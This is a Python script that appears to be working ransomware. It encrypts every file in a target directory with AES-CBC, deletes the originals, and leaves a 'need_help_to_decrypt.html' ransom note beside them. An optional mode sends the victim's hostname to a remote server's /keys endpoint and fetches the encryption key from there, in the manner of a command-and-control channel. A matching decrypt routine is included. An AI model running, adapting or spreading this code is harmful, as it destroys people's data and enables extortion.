import argparse
import os
from Crypto.Cipher import AES
import os
import requests
import shutil
import sys


def encrypt_file(key, in_filename, out_filename=None, chunksize=64 * 1024):
    if not out_filename:
        out_filename = in_filename + ".enc"
    filesize = str(os.path.getsize(in_filename)).zfill(16)
    IV = os.urandom(16)

    encryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(in_filename, "rb") as infile:
        with open(out_filename, "wb") as outfile:
            outfile.write(filesize.encode("utf-8"))
            outfile.write(IV)

            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break

                elif len(chunk) % 16 != 0:
                    chunk += b" " * (16 - (len(chunk) % 16))

                outfile.write(encryptor.encrypt(chunk))
    os.remove(in_filename)


def decrypt_file(key, in_filename, out_filename=None, chunksize=64 * 1024):
    if not out_filename:
        out_filename = in_filename[:-4]
    with open(in_filename, "rb") as infile:
        filesize = int(infile.read(16))
        IV = infile.read(16)

        decryptor = AES.new(key, AES.MODE_CBC, IV)

        with open(out_filename, "wb") as outfile:
            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break

                outfile.write(decryptor.decrypt(chunk))

            outfile.truncate(filesize)
    os.remove(in_filename)


def process_directory(directory, action, key):
    for filename in os.listdir(directory):
        if not os.path.isfile(os.path.join(directory, filename)):
            continue
        if action == "encrypt":
            encrypt_file(key, os.path.join(directory, filename))
            shutil.copy(os.path.abspath('./cc/index.html'), os.path.join(
                directory, "need_help_to_decrypt.html"))

        elif action == "decrypt":
            if filename != "need_help_to_decrypt.html":
                decrypt_file(key, os.path.join(directory, filename))
            else:
                os.remove(os.path.join(directory, filename))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Encrypt or decrypt files in a directory."
    )
    parser.add_argument(
        "directory",
        type=str,
        help="The directory containing the files to be processed.",
    )
    parser.add_argument(
        "action",
        type=str,
        choices=["encrypt", "decrypt"],
        help="The action to perform on the files.",
    )
    parser.add_argument(
        "--url",
        type=str,
        help="The URL parameter containing the key. If present, the key will be obtained from the URL parameter and not from the command line arguments. Ex.: `http://localhost:8000/`",
    )

    parser.add_argument(
        "--key",
        type=str,
        help="The encryption or decryption key. It must have 16 catacteres.",
    )

    try:
        args = parser.parse_args()
    except:
        parser.print_help()
        sys.exit(0)

    if args.url:
        hostname = os.uname().nodename
        full_url = args.url+"keys"
        headers = {
            "accept": "application/json",
            "Content-Type": "application/json",
        }
        data = {
            "name": hostname,
        }

        response = requests.post(full_url, headers=headers, json=data)
        key = str(response.content.decode("utf-8")).replace('"', '')
        key = key.encode("utf-8")

    else:
        key = args.key.encode("utf-8")

    process_directory(args.directory, args.action, key)
